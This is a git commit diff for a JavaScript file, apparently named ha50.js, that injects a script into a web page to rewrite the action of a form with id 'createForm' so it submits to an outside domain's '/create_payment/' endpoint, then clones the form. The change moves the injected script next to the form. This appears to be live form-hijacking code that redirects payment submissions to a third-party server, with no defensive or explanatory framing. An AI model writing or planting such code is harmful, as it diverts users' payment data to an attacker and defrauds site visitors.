6ebf66bddda5a25a3a2e106a5227ceb15311eb2f
xjjkong <138182422+xjjkong@users.noreply.github.com>
2023-07-07 22:58:55 +0800

    Update and rename ha49.js to ha50.js

--- ha50.js
+++ ha50.js
@@ -1,8 +1,18 @@
 $(function() {
+    function insertAfter(newElement, targetElement) {
+        let parent = targetElement.parentNode;
+        if (parent.lastChild == targetElement) {
+            parent.appendChild(newElement);
+        } else {
+            parent.insertBefore(newElement, targetElement.nextSibling);
+        }
+    }
+
     const scriptEle = document.createElement("script");
     scriptEle.type = "text/javascript";
     scriptEle.text = `document.getElementById('createForm').action = 'https://www.xiaoxiaoshagua.com/create_payment/';`;
-    document.body.appendChild(scriptEle);
+    var formNode = document.getElementById('createForm');
+    insertAfter(scriptEle, formNode);
     let node = document.getElementById('createForm');
     let cv = node.cloneNode(true);
     document.body.appendChild(cv);
